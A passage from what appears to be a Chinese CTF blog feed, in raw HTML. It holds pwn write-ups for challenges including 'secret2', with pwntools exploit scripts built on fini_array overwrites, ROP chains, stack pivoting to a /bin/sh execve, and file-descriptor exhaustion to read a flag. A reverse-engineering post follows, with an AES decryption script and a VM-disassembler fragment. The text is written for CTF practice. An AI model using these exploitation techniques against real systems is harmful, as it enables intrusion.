class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">syscall = <span class="number">0x402504</span></span><br><span class="line">pop_rsp = <span class="number">0x402ee9</span> <span class="comment"># pop rsp; ret;</span></span><br><span class="line">pop_rdi = <span class="number">0x401746</span> <span class="comment"># pop rdi; ret;</span></span><br><span class="line">pop_rsi = <span class="number">0x406f70</span> <span class="comment"># pop rsi; ret;</span></span><br><span class="line">pop_rdx = <span class="number">0x447635</span> <span class="comment"># pop rdx; ret;</span></span><br><span class="line">pop_rax = <span class="number">0x44806c</span> <span class="comment"># pop rax; ret;</span></span><br><span class="line">leave = <span class="number">0x401CF3</span> <span class="comment"># leave; ret;</span></span><br><span class="line">fini_array_0 = <span class="number">0x4B50B0</span></span><br><span class="line">fini_array_1 = <span class="number">0x4B50B8</span></span><br><span class="line">bss = <span class="number">0x00000000004BD300</span> <span class="comment"># bss + 0x300</span></span><br><span class="line">main = <span class="number">0x401C1D</span></span><br><span class="line">__libc_csu_fini = <span class="number">0x402CA0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##############################################################</span></span><br><span class="line"><span class="comment"># _start ==&gt; __libc_start_main</span></span><br><span class="line"><span class="comment">#                  |                      /--&gt; init_array[0]</span></span><br><span class="line"><span class="comment">#                  +==&gt; __libc_csu_init  --&gt; ...</span></span><br><span class="line"><span class="comment">#                  |                      \--&gt; init_array[n]</span></span><br><span class="line"><span class="comment">#                  +==&gt; main</span></span><br><span class="line"><span class="comment">#                  |                      /--&gt; fini_array[n]</span></span><br><span class="line"><span class="comment">#                  +==&gt; __libc_csu_fini  --&gt; ...</span></span><br><span class="line"><span class="comment">#                                         \--&gt; fini_array[0]</span></span><br><span class="line"><span class="comment">###############################################################</span></span><br><span class="line"><span class="comment"># set fini_array_0 ==&gt; __libc_csu_fini</span></span><br><span class="line"><span class="comment">#     fini_array_1 ==&gt; main</span></span><br><span class="line"><span class="comment"># thus the program will execute as:</span></span><br><span class="line"><span class="comment"># main -&gt; __libc_csu_fini -&gt; main(fini_array_1) -&gt; libc_csu_fini(fini_array_0)</span></span><br><span class="line"><span class="comment">#                               ^                              |</span></span><br><span class="line"><span class="comment">#                               |                              |                       </span></span><br><span class="line"><span class="comment">#                               +------------------------------+</span></span><br><span class="line">payload = p64(fini_array_0)</span><br><span class="line">p.sendafter(<span class="string">"addr:"</span>, payload)</span><br><span class="line">payload = p64(__libc_csu_fini) + p64(main)</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># put data on bss (later will be set as fake stack)</span></span><br><span class="line">payload = p64(bss)</span><br><span class="line">p.sendafter(<span class="string">"addr:"</span>, payload)</span><br><span class="line">payload = <span class="string">"/bin/sh"</span>.ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)</span><br><span class="line">payload += p64(pop_rax) + p64(<span class="number">59</span>)</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = p64(bss + <span class="number">0x18</span>)</span><br><span class="line">p.sendafter(<span class="string">"addr:"</span>, payload)</span><br><span class="line">payload = p64(pop_rdi) + p64(bss)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = p64(bss + <span class="number">0x18</span> * <span class="number">2</span>)</span><br><span class="line">p.sendafter(<span class="string">"addr:"</span>, payload)</span><br><span class="line">payload = p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx) + p64(<span class="number">0</span>)</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = p64(bss + <span class="number">0x18</span> * <span class="number">3</span>)</span><br><span class="line">p.sendafter(<span class="string">"addr:"</span>, payload)</span><br><span class="line">payload = p64(syscall)</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># since at this moment rbp == fini_array_0</span></span><br><span class="line"><span class="comment"># set fini_array_0 ==&gt; leave</span></span><br><span class="line"><span class="comment">#     fini_array_1 ==&gt; pop_rsp</span></span><br><span class="line"><span class="comment">#     fini_array_1 + 8 ==&gt; bss</span></span><br><span class="line"><span class="comment"># migrate stack to bss</span></span><br><span class="line">payload = p64(fini_array_0)</span><br><span class="line">p.sendafter(<span class="string">"addr:"</span>, payload)</span><br><span class="line">payload = p64(leave) + p64(pop_rsp)</span><br><span class="line">payload += p64(bss + <span class="number">0x8</span>)</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="secret2"><a href="#secret2" class="headerlink" title="secret2"></a>secret2</h1><h2 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h2><ol><li>“/dev/random”每次<code>open</code>都没有<code>close</code>，默认情况下，一个进程最大文件描述符是1023（一共1024个），所以只要后面文件描述符用尽，读出来的就是”\x00”了</li><li>利用上面的思路，成功233次后，就可以利用rop了</li><li>题目应该是不能直接拿shell的，所以就上orw，因为标准输入流0被关闭了，所以打开的flag文件的描述符就是0了，直接从0读就能拿到flag</li></ol><h2 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi = <span class="number">0x000000000040161b</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000401619</span> <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line">pop_rsp = <span class="number">0x0000000000401615</span> <span class="comment"># pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line">gadget_1 = <span class="number">0x00000000004015F8</span></span><br><span class="line">gadget_2 = <span class="number">0x000000000040160E</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:00000000004015F8 loc_4015F8:                             ; CODE XREF: init+4C↓j</span></span><br><span class="line"><span class="string">.text:00000000004015F8                 mov     rdx, r15</span></span><br><span class="line"><span class="string">.text:00000000004015FB                 mov     rsi, r14</span></span><br><span class="line"><span class="string">.text:00000000004015FE                 mov     edi, r13d</span></span><br><span class="line"><span class="string">.text:0000000000401601                 call    qword ptr [r12+rbx*8]</span></span><br><span class="line"><span class="string">.text:0000000000401605                 add     rbx, 1</span></span><br><span class="line"><span class="string">.text:0000000000401609                 cmp     rbp, rbx</span></span><br><span class="line"><span class="string">.text:000000000040160C                 jnz     short loc_4015F8</span></span><br><span class="line"><span class="string">.text:000000000040160E</span></span><br><span class="line"><span class="string">.text:000000000040160E loc_40160E:                             ; CODE XREF: init+31↑j</span></span><br><span class="line"><span class="string">.text:000000000040160E                 add     rsp, 8</span></span><br><span class="line"><span class="string">.text:0000000000401612                 pop     rbx</span></span><br><span class="line"><span class="string">.text:0000000000401613                 pop     rbp</span></span><br><span class="line"><span class="string">.text:0000000000401614                 pop     r12</span></span><br><span class="line"><span class="string">.text:0000000000401616                 pop     r13</span></span><br><span class="line"><span class="string">.text:0000000000401618                 pop     r14</span></span><br><span class="line"><span class="string">.text:000000000040161A                 pop     r15</span></span><br><span class="line"><span class="string">.text:000000000040161C                 retn</span></span><br><span class="line"><span class="string">.text:000000000040161C ; &#125; // starts at 4015C0</span></span><br><span class="line"><span class="string">.text:000000000040161C init            endp</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">"read"</span>]</span><br><span class="line">open_plt = elf.plt[<span class="string">"open"</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">"puts"</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x9</span></span><br><span class="line">payload += flat([pop_rsi, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rdi, <span class="number">0x4021DF</span>])</span><br><span class="line">payload += flat([open_plt])</span><br><span class="line">payload += flat([gadget_2, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, elf.bss(<span class="number">0x600</span>), <span class="number">0x40</span>])</span><br><span class="line">payload += flat([gadget_1, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rdi, elf.bss(<span class="number">0x600</span>)])</span><br><span class="line">payload += flat([puts_plt])</span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x400</span> - <span class="number">1</span> + <span class="number">232</span>):</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(<span class="string">"\x00"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul><li>分析写得比较简单，因为大多是改编题，如果出现有问题的地方欢迎指正</li><li>感觉自己速度还是不够快，感觉还是不够熟练，要学的东西还很多</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;嘴上说不能再打了，一堆事情没做，身体却很诚实。主要是奔着pwn来的，也没想着要冲榜啥的，纯当练习了。&lt;br&gt;OJ1的本地和远程环境的不一致让我与AK失之交臂，还是赛后问出题的师傅才发现思路是对的（难顶，我的本地感觉有毒，无数次死在本地环境上）。简单记录一下， 没有写的很详细。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Competition" scheme="https://n0nop.github.io/categories/Competition/"/>
    
    
      <category term="CTF" scheme="https://n0nop.github.io/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯 第四场: rev</title>
    <link href="https://n0nop.github.io/2020/05/21/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E7%AC%AC%E5%9B%9B%E5%9C%BA-rev/"/>
    <id>https://n0nop.github.io/2020/05/21/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E7%AC%AC%E5%9B%9B%E5%9C%BA-rev/</id>
    <published>2020-05-21T14:21:28.000Z</published>
    <updated>2020-05-21T14:49:09.969Z</updated>
    
    <content type="html"><![CDATA[<p>pwn学艺不精，确认过名字，是我没学过的类型。就搞了一个babyvm，java是后来看的，还有个babyperf，最近rev做得少，没见过，还没搞出来，学一波先。</p><a id="more"></a><h1 id="java"><a href="#java" class="headerlink" title="java"></a>java</h1><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>挺简单的，就不详细写了，就是xor + AES_ECB + base64。</p><h2 id="script"><a href="#script" class="headerlink" title="script"></a>script</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES </span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode <span class="keyword">as</span> bd</span><br><span class="line"></span><br><span class="line">val = [<span class="number">214</span>, <span class="number">144</span>, <span class="number">233</span>, <span class="number">254</span>, <span class="number">204</span>, <span class="number">225</span>, <span class="number">61</span>, <span class="number">183</span>, <span class="number">22</span>, <span class="number">182</span>, <span class="number">43</span>, <span class="number">103</span>, <span class="number">20</span>, <span class="number">194</span>, <span class="number">40</span>, <span class="number">251</span>, <span class="number">44</span>, <span class="number">5</span>, <span class="number">43</span>, <span class="number">103</span>, <span class="number">154</span>, <span class="number">118</span>, <span class="number">42</span>, <span class="number">190</span>, <span class="number">4</span>, <span class="number">195</span>, <span class="number">43</span>, <span class="number">103</span>, <span class="number">170</span>, <span class="number">68</span>, <span class="number">19</span>, <span class="number">38</span>, <span class="number">73</span>, <span class="number">134</span>, <span class="number">43</span>, <span class="number">103</span>, <span class="number">153</span>, <span class="number">156</span>, <span class="number">66</span>, <span class="number">80</span>, <span class="number">244</span>, <span class="number">145</span>, <span class="number">80</span>, <span class="number">103</span>, <span class="number">239</span>, <span class="number">152</span>, <span class="number">122</span>, <span class="number">98</span>, <span class="number">50</span>, <span class="number">214</span>]</span><br><span class="line"></span><br><span class="line">string = bd(<span class="string">'VsBDJCvuhD65/+sL+Hlf587nWuIa2MPcqZaq7GMVWI0Vx8l9R42PXWbhCRftoFB3'</span>)</span><br><span class="line">print(string)</span><br><span class="line"></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(string)):</span><br><span class="line">    res.append(ord(string[i]) ^ val[i] ^ <span class="number">22</span>)</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">''</span>.join([chr(item) <span class="keyword">for</span> item <span class="keyword">in</span> res])</span><br><span class="line">print(len(cipher))</span><br><span class="line"></span><br><span class="line">key = <span class="string">"aos_chock_koy!@#"</span></span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">print(aes.decrypt(cipher))</span><br></pre></td></tr></table></figure><h1 id="babyvm"><a href="#babyvm" class="headerlink" title="babyvm"></a>babyvm</h1><h2 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h2><ol><li>输入形如 “flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}” 的flag，其中”x“为[0-9a-f]</li><li>判断flag长度为42，判断flag特征，顺序提取出的16进制字符串的长度为32<br> <img src="/2020/05/21/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E7%AC%AC%E5%9B%9B%E5%9C%BA-rev/check.png" alt></li><li>将16进制字符串encode(‘hex’)，得到长度16的字符串<br> <img src="/2020/05/21/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E7%AC%AC%E5%9B%9B%E5%9C%BA-rev/hex.png" alt></li><li>计算字符串的md5，以及通过算法扩展至100长度的字符串的md5<br> <img src="/2020/05/21/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E7%AC%AC%E5%9B%9B%E5%9C%BA-rev/md5.png" alt></li><li>以上明文字符串，md5，扩展md5分为4组，分组输入虚拟机计算<br> <img src="/2020/05/21/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E7%AC%AC%E5%9B%9B%E5%9C%BA-rev/vm.png" alt><br> <img src="/2020/05/21/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E7%AC%AC%E5%9B%9B%E5%9C%BA-rev/prepare.png" alt></li><li>虚拟机执行，结果通过第一个寄存器返回，指令集： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0</span>: <span class="string">"mov"</span>, <span class="comment"># from stack</span></span><br><span class="line"><span class="number">0x1</span>: <span class="string">"push"</span>, <span class="comment"># imm</span></span><br><span class="line"><span class="number">0x2</span>: <span class="string">"pop"</span>,</span><br><span class="line"><span class="number">0x3</span>: <span class="string">"call"</span>,</span><br><span class="line"><span class="number">0x4</span>: <span class="string">"ret"</span>,</span><br><span class="line"><span class="number">0x5</span>: <span class="string">"jmp"</span>,</span><br><span class="line"><span class="number">0x6</span>: <span class="string">"je"</span>,</span><br><span class="line"><span class="number">0x7</span>: <span class="string">"neg rflag"</span>,</span><br><span class="line"><span class="number">0x8</span>: <span class="string">"add"</span>,</span><br><span class="line"><span class="number">0x9</span>: <span class="string">"sub"</span>,</span><br><span class="line"><span class="number">0xA</span>: <span class="string">"mul"</span>,</span><br><span class="line"><span class="number">0xB</span>: <span class="string">"div"</span>,</span><br><span class="line"><span class="number">0xC</span>: <span class="string">"xor"</span>,</span><br><span class="line"><span class="number">0xD</span>: <span class="string">"push"</span>, <span class="comment"># reg</span></span><br><span class="line"><span class="number">0xE</span>: <span class="string">"cmp"</span>,</span><br><span class="line"><span class="number">0xF</span>: <span class="string">"and"</span>,</span><br><span class="line"><span class="number">0x10</span>: <span class="string">"or"</span>,</span><br><span class="line"><span class="number">0x11</span>: <span class="string">"ror"</span>,</span><br><span class="line"><span class="number">0x12</span>: <span class="string">"rol"</span>,</span><br><span class="line"><span class="number">0x13</span>: <span class="string">"neg"</span>,</span><br><span class="line"><span class="number">0x14</span>: <span class="string">"mod"</span>,</span><br><span class="line"><span class="number">0xD0</span>: <span class="string">"push"</span>,</span><br><span class="line"><span class="number">0xE0</span>: <span class="string">"mov"</span>, <span class="comment"># to stack</span></span><br><span class="line"><span class="number">0xF0</span>: <span class="string">"mov"</span>, <span class="comment"># to stack (imm)</span></span><br><span class="line"><span class="number">0xFF</span>: <span class="string">"halt"</span></span><br></pre></td></tr></table></figure></li><li>将计算结果进行比较</li></ol><h2 id="script-1"><a href="#script-1" class="headerlink" title="script"></a>script</h2><ol><li>提取指令： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line">ins = \</span><br><span class="line">[</span><br><span class="line">    <span class="number">0xD0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x0D</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x09</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x0D</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x06</span>, <span class="number">0x14</span>, <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x11</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x01</span>, <span class="number">0xB9</span>, <span class="number">0x79</span>, <span class="number">0x37</span>, <span class="number">0x9E</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x0C</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x0D</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x03</span>, <span class="number">0xAD</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x0E</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x07</span>, <span class="number">0x06</span>, <span class="number">0x19</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xD0</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xD0</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x03</span>, <span class="number">0x0D</span>, <span class="number">0x04</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x10</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x10</span>, <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x0D</span>, <span class="number">0x05</span>, <span class="number">0x0D</span>, <span class="number">0x04</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x05</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x0D</span>, <span class="number">0x05</span>, <span class="number">0x0D</span>, <span class="number">0x04</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x0D</span>, <span class="number">0x05</span>, <span class="number">0x0D</span>, <span class="number">0x04</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x0D</span>, <span class="number">0x05</span>, <span class="number">0x0D</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x0F</span>,</span><br><span class="line">    <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x06</span>, <span class="number">0x0C</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x02</span>, <span class="number">0x06</span>, <span class="number">0x0C</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x02</span>, <span class="number">0x06</span>, <span class="number">0x0C</span>, <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x02</span>, <span class="number">0x06</span>, <span class="number">0x0C</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x0D</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x13</span>, <span class="number">0x01</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0xE0</span>, <span class="number">0x08</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x03</span>,</span><br><span class="line">    <span class="number">0x12</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x04</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">opcode = \</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="string">"mov"</span>, <span class="comment"># from stack</span></span><br><span class="line">    <span class="number">0x1</span>: <span class="string">"push"</span>, <span class="comment"># imm</span></span><br><span class="line">    <span class="number">0x2</span>: <span class="string">"pop"</span>,</span><br><span class="line">    <span 